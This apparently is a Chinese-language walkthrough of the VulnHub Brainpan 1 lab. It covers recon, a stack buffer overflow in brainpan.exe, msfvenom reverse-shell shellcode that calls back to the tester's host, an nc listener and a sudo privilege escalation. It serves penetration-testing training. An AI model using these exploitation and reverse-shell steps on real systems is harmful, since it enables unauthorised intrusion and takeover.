Brainpan



项目简介：

##利用脚本：https://github.com/jessekurrus/brainpan

##项目地址：https://www.vulnhub.com/entry/brainpan-1,51/


0x01 信息收集

##1. 靶机IP查找：

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ sudo netdiscover -i eth0 -r 192.168.94.0/24

##2. 端口信息枚举:

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ sudo nmap -sS -sC -sV -Pn -p- 192.168.94.129

开放了两个端口，分别是9999和10000，9999为该系统的监听端口，10000为http服务端口

##3. 枚举http路径:

┌──(cxyzupup㉿kali)-[/usr/share/wordlists/dirbuster]└─$ gobuster dir -w directory-list-lowercase-2.3-medium.txt -u http://192.168.94.129:10000

发现bin路径，访问后发现一个exe的文件

##4. 收集exe文件信息：

###4.1 运行环境检查：

发现该文件运行环境为Windows 32

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ file brainpan.exe

###4.2 运行行为检查：

使用wine运行该文件，发现该文件开启了9999端口监听

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ wine brainpan.exe

###4.3 文件下载到本地使用nc建立连接

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ nc 127.0.0.1 9999

###4.4 枚举二进制文件中的可打印字符串

发现了strcpy函数，可能存在溢出

┌──(cxyzupup㉿kali)-[~/Desktop]└─$ strings brainpan.exe


0x02 弱点测试

##1. 二进制文件溢出测试：

这里需要把二进制文件拷贝到一台测试环境机器中，使用Immunity Debugger工具进行调试

###1.1 测试二进制文件可接受的字符长度：

长度达到1000后，连接异常

###1.2 生成1000长度的字符串：

┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

###1.3 运行脚本后查看EIP位置：

发现EIP位置已被35724134替换

┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ python brainpan1.py 192.168.94.130 9999

###1.4 获取缓冲区可接受控制的字节数（EIP位置）：

匹配到可偏移的长度为524

┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724143

发送524个A、4个B、472个C进行测试，发现eip位置已被3个42（ascii：B）填充了

###1.5 测试应用程序可识别的错误字符（ESP位置）：

发现除了空字节外其他都能使用

┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ python brainpan3.py 192.168.94.130 9999

###1.6 找到堆栈地址：

堆栈地址为311712F3

###1.7 生成shellcode：

使用恶意程序代码破坏堆栈，并且植入shellcode代码

┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ msfvenom -p windows/shell_reverse_tcp LPORT=1234 LHOST=192.168.94.128 -e x86/shikata_ga_nai -b "\x00" -f py

##2. 本地使用nc监听1234端口，再执行脚本成功获取了测试环境系统的shell
┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ nc -nlvp 1234····································································┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ python  brainpan4.py 192.168.94.130 9999


0x03 提权

成功获取到测试环境系统shell后，现在更换目标，将shellcode类型更换为靶机的（Linux）

##1. 生成并替换为Linux的shellcode
┌──(cxyzupup㉿kali)-[~/Desktop/brainpan溢出测试]└─$ msfvenom -p linux/x86/shell/reverse_tcp LPORT=1234 LHOST=192.168.94.128 -e x86/shikata_ga_nai -b "\x00" -f py

###1.1 本地开启nc端口监听，针对靶机执行脚本，获取shell：

使用python获取交互式shell：

python -c "import pty; pty.spawn('/bin/bash')"

##2. 获取管理员权限

###2.1 执行sudo -l命查看权限，发现以下路径具有root权限，不需要密码

puck@brainpan:/home/puck$ sudo -l

###2.2 sudo到提示路径下成功提权
